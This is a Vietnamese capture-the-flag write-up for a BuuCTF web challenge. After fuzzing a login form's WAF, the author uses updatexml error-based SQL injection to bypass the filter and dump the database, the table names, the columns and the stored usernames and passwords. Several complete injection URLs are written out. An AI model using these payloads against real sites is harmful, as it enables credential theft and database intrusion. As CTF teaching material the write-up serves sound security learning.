![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/aa50aa77-e28d-44b1-864d-8243a56c7e95)

Vào challenge thì ta sẽ có 1 form đăng nhập như trên, mình thử 1 vài câu lệnh SQL cơ bản nhưng có lẽ nó đã bị filter bởi WAF.

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/4cb2fe44-30a7-43d1-9630-729e8a4629e0)

Do đó mình đã thử fuzzing các payload

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/4ba246aa-0aa6-403e-8944-be515fd82834)

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/44714c44-ba6b-4ea3-a6ea-39ddc8ec9198)

Ta có thể thấy rằng các từ như ``AND``, ``UNION``,... đã bị filter. Nhưng nó cũng để hở ra 1 vài từ như ``updatexml``, ``TABLE_SCHEMA``, do đó mình có thể sử dụng hàm ``updatexml`` để tạo payload.

``http://d6e89027-2d4b-48bc-ab4a-89c40fa15598.node4.buuoj.cn:81/check.php?username=admin%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&password=123``

Ta đã thành công với payload trên, tiếp theo ta sẽ show các bảng ra.

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/a3e5adc8-10eb-4a19-90ab-b573524852ad)

``http://d6e89027-2d4b-48bc-ab4a-89c40fa15598.node4.buuoj.cn:81/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=123``

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/46d0a0b3-0968-4098-843b-a80e57832b85)

``http://d6e89027-2d4b-48bc-ab4a-89c40fa15598.node4.buuoj.cn:81/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23&password=123``

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/9f5a39f5-eb2f-4e5a-896f-110bb5876b7f)

``http://d6e89027-2d4b-48bc-ab4a-89c40fa15598.node4.buuoj.cn:81/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(username,%27~%27,password))from(H4rDsq1)),0x7e),1))%23&password=123``

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/f30863ee-8647-44a9-8533-05c8d6d74c87)

Do payload đưa vào có giới hạn độ dài nên mình sử dụng các câu lệnh ``left()`` và ``right()`` để truy vấn riêng biệt, sau đó nối chuỗi flag lại.

``http://d6e89027-2d4b-48bc-ab4a-89c40fa15598.node4.buuoj.cn:81/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&password=123``

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/a41a99ff-52cb-4257-ae34-1d42518fc12e)
